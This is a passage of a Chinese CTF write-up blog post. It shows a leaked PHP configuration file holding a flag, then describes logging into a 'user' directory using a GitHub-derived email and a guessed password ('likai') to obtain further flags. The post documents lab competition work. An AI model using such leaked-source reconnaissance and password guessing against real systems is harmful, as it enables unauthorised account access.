+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* flag&#123;9660dc40-0272-44fd-a045-6e6f0f98fca0&#125; */</span></span><br><span class="line"><span class="keyword">require</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/function.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;DBHOST&quot;</span>,<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DBUSER&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DBPASS&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DBNAME&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;ROOTDRI&#x27;</span>,<span class="keyword">__DIR__</span>.<span class="string">&quot;/../&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;WEB_TITLE&quot;</span>,<span class="string">&#x27;标题&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;PRO_KEY&quot;</span>,<span class="string">&quot;1071f87ebcf2fb9f96f174eca1ee2dd6&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_GET</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$_GET</span>  = <span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_GET</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$_POST</span> = <span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_POST</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$_COOKIE</span>   = <span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_COOKIE</span>);</span><br><span class="line">    <span class="variable">$_REQUEST</span>  = <span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_REQUEST</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span>(ROOTDRI.<span class="string">&#x27;/org/smarty/Smarty.class.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="FLAG值-1"><a href="#FLAG值-1" class="headerlink" title="FLAG值"></a>FLAG值</h4><p>flag{9660dc40-0272-44fd-a045-6e6f0f98fca0}</p>
+<h3 id="0x02开始渗透"><a href="#0x02开始渗透" class="headerlink" title="0x02开始渗透"></a>0x02开始渗透</h3><h4 id="操作内容-1"><a href="#操作内容-1" class="headerlink" title="操作内容"></a>操作内容</h4><p>github上的项目名为user，访问user目录，提示登陆。</p>
+<p>根据登陆页面，用户名是邮箱，根据给出提示猜测密码。</p>
+<p>邮箱为github邮箱，密码为<code>likai</code>，得到flag。</p>
+<p><img src="https://github.com/Windylh/image/raw/master/2017.11.25/xnuca-1.png"></p>
+<h4 id="FLAG值-2"><a href="#FLAG值-2" class="headerlink" title="FLAG值"></a>FLAG值</h4><p>flag{cc498da1-3918-48be-b9e2-c64c69a5349e}</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/WriteUp/" rel="tag"># WriteUp</a>
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2017/09/18/%E5%AE%9E%E9%AA%8C%E5%90%A7(%E5%AF%86%E7%A0%81%E5%AD%A6%E3%80%81%E6%9D%82%E9%A1%B9%E3%80%81%E9%9A%90%E5%86%99%E9%83%A8%E5%88%86)Writeup/" rel="prev" title="实验吧(密码学、杂项、隐写部分)Writeup">
+      <i class="fa fa-chevron-left"></i> 实验吧(密码学、杂项、隐写部分)Writeup
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2017/09/18/Wordpress%E6%8F%92%E4%BB%B6%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="next" title="Wordpress插件渗透测试">
+      Wordpress插件渗透测试 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#No-8-%E7%9C%8B%E8%A7%86%E9%A2%91%E7%9C%9F%E5%97%A8%E7%9A%AE%EF%BC%88%E8%AF%BB%EF%BC%9A50%E5%88%86%EF%BC%8C%E5%86%99%EF%BC%9A100%E5%88%86%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">#No.8 看视频真嗨皮（读：50分，写：100分）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#No-23-%E6%89%BE%E5%85%A5%E5%8F%A3%EF%BC%88%E8%AF%BB%EF%BC%9A100%E5%88%86%EF%BC%8C%E5%86%99%EF%BC%9A200%E5%88%86%EF%BC%89"><span class="nav-number">2.</span> <span class="nav-text">#No.23 找入口（读：100分，写：200分）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E8%BD%AE"><span class="nav-number"></span> <span class="nav-text">第三轮</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">0.1.</span> <span class="nav-text">0x00信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#FLAG%E5%80%BC"><span class="nav-number">0.1.1.</span> <span class="nav-text">FLAG值</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01%E4%BF%A1%E6%81%AF%E5%88%86%E6%9E%90"><span class="nav-number">0.2.</span> <span class="nav-text">0x01信息分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9"><span class="nav-number">0.2.1.</span> <span class="nav-text">操作内容</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#FLAG%E5%80%BC-1"><span class="nav-number">0.2.2.</span> <span class="nav-text">FLAG值</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02%E5%BC%80%E5%A7%8B%E6%B8%97%E9%80%8F"><span class="nav-number">0.3.</span> <span class="nav-text">0x02开始渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9-1"><span class="nav-number">0.3.1.</span> <span class="nav-text">操作内容</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#FLAG%E5%80%BC-2"><span class="nav-number">0.3.2.</span> <span class="nav-text">FLAG值</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Windylh</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">35</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://blog.izilong.net/" title="http:&#x2F;&#x2F;blog.izilong.net&#x2F;" rel="noopener" target="_blank">Zilong's blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://p0sec.net/" title="https:&#x2F;&#x2F;p0sec.net&#x2F;" rel="noopener" target="_blank">p0's blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://p0desta.com/" title="http:&#x2F;&#x2F;p0desta.com&#x2F;" rel="noopener" target="_blank">p0desta's blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://mengsec.com/" title="https:&#x2F;&#x2F;mengsec.com&#x2F;" rel="noopener" target="_blank">Mengchen's blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://keysking.github.io/" title="https:&#x2F;&#x2F;keysking.github.io&#x2F;" rel="noopener" target="_blank">Keysking's blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://lanvnal.com/" title="http:&#x2F;&#x2F;lanvnal.com&#x2F;" rel="noopener" target="_blank">LANVNAL's blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://0sec.com.cn/" title="http:&#x2F;&#x2F;0sec.com.cn&#x2F;" rel="noopener" target="_blank">Fazx's blog</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Windylh</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
